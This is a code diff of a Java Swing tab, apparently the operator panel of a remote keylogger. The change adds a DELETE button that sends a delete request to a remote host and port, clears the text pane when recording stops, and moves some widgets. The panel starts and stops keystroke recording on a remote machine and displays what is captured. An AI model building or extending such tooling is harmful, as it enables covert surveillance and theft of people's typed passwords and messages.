@@ -23,6 +23,7 @@ import java.awt.Font;
 import javax.swing.JPanel;
 import javax.swing.SwingConstants;
 
+import KeyLogger.KeyLoggerDelete;
 import KeyLogger.KeyLoggerStart;
 import KeyLogger.KeyLoggerStop;
 
@@ -68,11 +69,13 @@ public class KeyLoggerTab extends JInternalFrame {
 		btnStop.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent e) {
 				if(isRecord) {
+					textPane.setText("");
 					KeyLoggerStop keyLoggerStop = new KeyLoggerStop(host, port);
 					keyLoggerStop.sendRequest();
 					String data = (String) keyLoggerStop.getResponseData();
 					textPane.setText(data);
 					isRecord = false;
+					
 				}
 			}
 		});
@@ -80,14 +83,25 @@ public class KeyLoggerTab extends JInternalFrame {
 		getContentPane().add(btnStop);
 		
 		JPanel panel = new JPanel();
-		panel.setBounds(461, 25, 47, 44);
+		panel.setBounds(510, 25, 47, 44);
 		getContentPane().add(panel);
 		
 		JLabel lblNewLabel = new JLabel("Record");
 		lblNewLabel.setFont(new Font("Tahoma", Font.PLAIN, 13));
 		lblNewLabel.setHorizontalAlignment(SwingConstants.CENTER);
-		lblNewLabel.setBounds(461, 10, 45, 13);
+		lblNewLabel.setBounds(512, 10, 45, 13);
 		getContentPane().add(lblNewLabel);
+		
+		JButton btnNewButton = new JButton("DELETE");
+		btnNewButton.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent e) {
+				KeyLoggerDelete keyLoggerDelete = new KeyLoggerDelete(host, port);
+				keyLoggerDelete.sendRequest();
+				textPane.setText("");
+			}
+		});
+		btnNewButton.setBounds(405, 25, 95, 44);
+		getContentPane().add(btnNewButton);
 		setVisible(true);
 		
 	}
